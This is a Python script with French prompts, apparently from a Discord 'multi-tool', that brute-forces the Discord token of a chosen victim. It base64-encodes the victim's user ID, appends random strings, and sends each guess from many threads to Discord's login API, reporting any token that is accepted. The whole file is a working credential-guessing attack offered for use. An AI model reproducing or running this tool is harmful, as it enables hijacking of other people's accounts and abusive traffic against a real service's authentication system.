from Options.Options import *

import base64
import threading
import random
import string
import requests
import colorama
from colorama import Fore
colorama.init()

TitrePage("Token Id Brute")

print(f"{couleur.RED}(si vous entrez un mauvais ID ca ne marchera pas)")
idtoken = base64.b64encode((input(f"{couleur.RED}Victime ID -> {couleur.RESET}")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
try:
 thrd =  input(f"{couleur.RED}\nThreads -> {couleur.RESET}")
except:
 print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un nombre !", couleur.RESET)
 time.sleep(3)
 Reset()

def bruhmoment():
    while idtoken == idtoken:
        try:
         token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        except:
         print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un ID valable !", couleur.RESET)
         time.sleep(3)
         Reset()
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(f"{couleur.GREEN}[X] | {couleur.CYAN}{token}{couleur.GREEN} | Token Trouvé{couleur.RESET}")

        else:
                print(f"{couleur.RED}[X] | {couleur.CYAN}{token}{couleur.RED} | Token Invalide{couleur.RESET}")

threads = []
try:
 for _ in range(int(thrd)):
    t = threading.Thread(target=bruhmoment)
    t.start()
    threads.append(t)
except:
 print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un nombre !", couleur.RESET)
 time.sleep(3)
 Reset()

for thread in threads:
    thread.join()